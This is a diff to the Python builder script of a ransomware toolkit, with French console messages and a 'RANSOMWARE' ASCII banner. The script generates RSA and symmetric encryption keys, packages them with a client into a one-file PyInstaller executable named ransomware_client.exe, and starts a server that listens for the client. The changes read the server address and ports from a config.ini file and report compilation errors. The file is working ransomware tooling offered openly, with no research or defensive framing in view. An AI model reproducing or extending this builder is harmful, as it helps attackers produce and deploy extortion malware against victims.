@@ -4,6 +4,8 @@ import shutil
 import signal
 import sys
 import time
+import configparser
+from utils import resource_path
 from tqdm import tqdm
 from colorama import Fore, Style, init
 from cryptography.hazmat.primitives.asymmetric import rsa
@@ -21,6 +23,16 @@ Ascii_Banner="""
 ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║██║  ██║╚██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝                                                               
 """
+
+def load_config():
+    config_path = resource_path('server/config.ini')
+    config = configparser.ConfigParser()
+    config.read(config_path)
+    return config
+
+def save_config(config):
+    with open('server/config.ini', 'w') as configfile:
+        config.write(configfile)
 
 def generate_rsa_keys():
     print(Fore.CYAN + "Génération des clés RSA...")
@@ -66,18 +78,31 @@ def generate_symmetric_key():
 
 def compile_executable():
     print(Fore.CYAN + "Compilation de l'exécutable...")
-    # Supprimer le dossier dist s'il existe déjà
+    # Supprimer les dossier dist et build s'ils existent déjà
     if os.path.exists('dist'):
         shutil.rmtree('dist')
+    if os.path.exists('build'):
+        shutil.rmtree('build')
 
     # Compiler l'exécutable avec PyInstaller
     process = subprocess.Popen([
         'pyinstaller', '--onefile', '--name=ransomware_client',
         '--add-data', 'keys/public_key.pem:keys',
         '--add-data', 'keys/symmetric_key.bin:keys',
-        '--add-data', 'client/config.py:client',
+        '--add-data', 'server/config.ini:server',
+        '--add-data', 'client:client',  # Inclure tout le répertoire client
+        '--add-data', 'utils.py:.',
         'client/main.py'
-    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ], # stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    
+    stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    )
+
+    stdout, stderr = process.communicate()
+    if process.returncode != 0:
+        print(Fore.RED + "Erreur lors de la compilation :")
+        print(stderr.decode())
+
 
     # Afficher une barre de progression pour simuler un chargement
     with tqdm(total=100, desc="Compilation en cours", colour="green") as pbar:
@@ -87,20 +112,21 @@ def compile_executable():
         pbar.update(pbar.total - pbar.n)
 
     # Afficher le chemin de l'exécutable
-    executable_path = os.path.join('dist', 'ransomware_client.exe')
+    executable_path = os.path.join(os.path.dirname(__file__), 'dist', 'ransomware_client.exe')
     print(Fore.GREEN + "Compilation terminée !")
     print(Fore.CYAN + "L'exécutable a été généré à l'emplacement suivant : " + Fore.LIGHTMAGENTA_EX + f"{executable_path}")
 
-def start_server(server_ip, server_port):
-    print(Fore.CYAN + "Modification du fichier config.py du serveur avec l'adresse et le port spécifiés...")
-    # Modifier le fichier config.py du serveur avec l'adresse et le port spécifiés
-    with open('server/config.py', 'w') as config_file:
+def start_server(server_ip, server_port, local_port):
+    """ print(Fore.CYAN + "Modification du fichier config.ini du serveur avec l'adresse et le port spécifiés...")
+    # Modifier le fichier config.ini du serveur avec l'adresse et le port spécifiés
+    with open('server/config.ini', 'w') as config_file:
         config_file.write(f"SERVER_IP = '{server_ip}'\n")
         config_file.write(f"SERVER_PORT = {server_port}\n")
+        config_file.write(f"SERVER_PORT = {server_port}\n") """
 
     # Lancer le serveur
-    print(Fore.CYAN + "Lancement du serveur...")
-    server_process = subprocess.Popen(['python', 'server/app.py'])
+    print(Fore.CYAN + f"Lancement du serveur sur le port local {local_port}...")
+    server_process = subprocess.Popen(['python', 'server/app.py', '--port', str(local_port)])
 
     def signal_handler(sig, frame):
         print(Fore.YELLOW + 'Arrêt du serveur...')
@@ -116,9 +142,21 @@ def main():
     # Afficher la bannière ASCII
     print(Fore.LIGHTMAGENTA_EX + Ascii_Banner)
 
-    # Demander à l'utilisateur l'adresse et le numéro de port du serveur
-    server_ip = input(Fore.CYAN + "Veuillez entrer l'adresse IP du serveur : ")
-    server_port = input(Fore.CYAN + "Veuillez entrer le numéro de port du serveur : ")
+    # Charger la configuration
+    config = load_config()
+
+    # Demander à l'utilisateur l'adresse IP et le numéro de port du serveur pour la connexion client
+    server_ip = input(Fore.CYAN + f"Veuillez entrer l'adresse IP du serveur pour la connexion client [{config['SERVER']['client_ip']}] : ") or config['SERVER']['client_ip']
+    server_port = input(Fore.CYAN + f"Veuillez entrer le numéro de port du serveur pour la connexion client [{config['SERVER']['client_port']}] : ") or config['SERVER']['client_port']
+
+    # Demander à l'utilisateur le port local pour le serveur
+    local_port = input(Fore.CYAN + f"Veuillez entrer le numéro de port local pour le serveur [{config['SERVER']['local_port']}] : ") or config['SERVER']['local_port']
+
+    # Mettre à jour la configuration avec les nouvelles valeurs
+    config['SERVER']['client_ip'] = server_ip
+    config['SERVER']['client_port'] = server_port
+    config['SERVER']['local_port'] = local_port
+    save_config(config)
 
     # Générer les clés
     generate_rsa_keys()
@@ -128,7 +166,7 @@ def main():
     compile_executable()
 
     # Lancer le serveur
-    start_server(server_ip, server_port)
+    start_server(server_ip, server_port, local_port)
 
 if __name__ == "__main__":
     main()
